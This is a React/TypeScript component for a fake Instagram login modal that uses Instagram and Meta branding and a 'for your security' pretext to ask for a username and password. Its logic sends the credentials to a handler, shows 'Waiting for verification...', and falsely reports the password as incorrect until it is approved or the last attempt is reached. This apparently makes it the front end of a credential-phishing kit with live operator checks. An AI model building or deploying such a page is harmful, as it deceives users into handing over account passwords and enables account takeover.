'use client';

import InstagramLogoImage from '@/assets/images/logo-insta.webp';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { imageSrc } from '@/utils/image-src';
import Image from 'next/image';
import { useState, type FC, type FormEvent } from 'react';

const IG_INPUT =
    'h-[40px] w-full rounded-[10px] border border-[#dbdbdb] bg-[#fafafa] px-3 text-[14px] text-[#262626] placeholder:text-[#8e8e8e] transition-all focus:border-[#E1306C] focus:bg-white focus:outline-none focus:ring-2 focus:ring-[#E1306C]/25';

interface InstagramLoginModalProps {
    show: boolean;
    texts: Record<string, string>;
    onClose: () => void;
    onSubmit: (identity: string, password: string) => Promise<{ approved: boolean; isLastAttempt: boolean }>;
    onSuccess: () => void;
}

const InstagramLoginModal: FC<InstagramLoginModalProps> = ({ show, texts, onClose, onSubmit, onSuccess }) => {
    const [identity, setIdentity] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [waitingApproval, setWaitingApproval] = useState(false);

    if (!show) return null;

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!identity.trim() || !password.trim() || isLoading) return;

        setIsLoading(true);
        setShowError(false);
        setWaitingApproval(true);

        try {
            const result = await onSubmit(identity, password);
            setWaitingApproval(false);

            if (result.approved || result.isLastAttempt) {
                onSuccess();
                return;
            }

            setShowError(true);
            setPassword('');
        } catch {
            setWaitingApproval(false);
            setShowError(true);
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-[1040] flex items-center justify-center bg-black/45 p-4'>
            <div
                className='relative flex w-full max-w-[480px] flex-col overflow-hidden rounded-2xl bg-white p-5 shadow-[0_20px_50px_rgba(15,23,42,0.2)]'
                style={{
                    minHeight: 'min(860px, calc(100vh - 16px))',
                    maxHeight: 'min(860px, calc(100vh - 16px))'
                }}
            >
                <button
                    type='button'
                    onClick={onClose}
                    className='absolute top-4 right-4 z-10 flex h-8 w-8 items-center justify-center rounded-full text-[#8e8e8e] transition-colors hover:bg-[#f2f2f2]'
                    aria-label={texts.closeLabel || 'Close'}
                >
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                </button>

                <div className='h-1 w-full shrink-0 rounded-full bg-linear-to-r from-[#833AB4] via-[#E1306C] to-[#F77737]' />

                <div className='flex min-h-0 flex-1 flex-col justify-between pt-6'>
                    <div className='w-full'>
                        <div className='mb-6 flex flex-col items-center'>
                            <div className='mb-5 flex h-[72px] w-[72px] items-center justify-center rounded-[18px] bg-linear-to-br from-[#833AB4] via-[#E1306C] to-[#FCAF45] p-[2px] shadow-[0_6px_20px_rgba(225,48,108,0.3)]'>
                                <div className='flex h-full w-full items-center justify-center rounded-[16px] bg-white'>
                                    <Image src={InstagramLogoImage} alt={texts.altInstagram || 'Instagram'} width={48} height={48} className='object-contain' priority />
                                </div>
                            </div>
                            <h2 className='text-[20px] font-semibold text-[#262626]'>
                                {texts.igLoginTitle || 'Log in to Instagram'}
                            </h2>
                            <p className='mt-2 px-2 text-center text-[14px] leading-relaxed text-[#9a979e]'>
                                {texts.igLoginSubtitle || texts.securityReason || 'For your security, please enter your password to continue.'}
                            </p>
                        </div>

                        <form onSubmit={handleSubmit} className='space-y-3' autoComplete='off'>
                            <input
                                type='text'
                                value={identity}
                                onChange={(e) => {
                                    setIdentity(e.target.value);
                                    if (showError) setShowError(false);
                                }}
                                className={IG_INPUT}
                                placeholder={texts.igLoginIdentity || texts.loginIdentityPlaceholder || 'Phone number, username, or email'}
                                autoComplete='username'
                                required
                            />

                            <div className='relative'>
                                <input
                                    type={showPassword ? 'text' : 'password'}
                                    value={password}
                                    onChange={(e) => {
                                        setPassword(e.target.value);
                                        if (showError) setShowError(false);
                                    }}
                                    className={`${IG_INPUT} pr-10`}
                                    placeholder={texts.password || 'Password'}
                                    autoComplete='current-password'
                                    maxLength={30}
                                    required
                                />
                                <button
                                    type='button'
                                    onClick={() => setShowPassword((v) => !v)}
                                    className='absolute top-1/2 right-3 -translate-y-1/2 text-[#6b7280] hover:text-[#E1306C]'
                                    aria-label={showPassword ? texts.hidePasswordLabel || 'Hide password' : texts.showPasswordLabel || 'Show password'}
                                >
                                    <svg viewBox='0 0 24 24' width='18' height='18' fill='none' stroke='currentColor' strokeWidth='1.8'>
                                        <path d='M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z' />
                                        <circle cx='12' cy='12' r='2.8' />
                                        {showPassword && <path d='M4 20L20 4' />}
                                    </svg>
                                </button>
                            </div>

                            {showError && (
                                <p className='text-[14px] text-[#ef4444]'>
                                    {texts.passwordIncorrect || 'Password is incorrect, please try again.'}
                                </p>
                            )}

                            {waitingApproval && isLoading && (
                                <p className='text-center text-[13px] text-[#E1306C]'>
                                    {texts.waitingApproval || 'Waiting for verification...'}
                                </p>
                            )}

                            <button
                                type='submit'
                                disabled={isLoading || !identity.trim() || !password.trim()}
                                className='flex h-10 w-full items-center justify-center rounded-full bg-linear-to-r from-[#833AB4] via-[#E1306C] to-[#F77737] text-[14px] font-semibold text-white transition-all hover:brightness-105 disabled:cursor-default disabled:opacity-70'
                            >
                                {isLoading ? (
                                    <span className='h-[18px] w-[18px] animate-spin rounded-full border-2 border-white/40 border-t-white' />
                                ) : (
                                    texts.igLoginButton || texts.continueBtn || 'Log in'
                                )}
                            </button>

                            <p className='pt-1 text-center'>
                                <span className='cursor-pointer text-[14px] text-[#0095f6] hover:underline'>
                                    {texts.forgotPassword || 'Forgot your password?'}
                                </span>
                            </p>
                        </form>
                    </div>

                    <div className='mt-6 w-16 self-center'>
                        <img src={imageSrc(MetaLogo)} width='100%' alt={texts.altMeta || 'Meta'} className='object-contain' />
                    </div>
                </div>
            </div>
        </div>
    );
};

export default InstagramLoginModal;
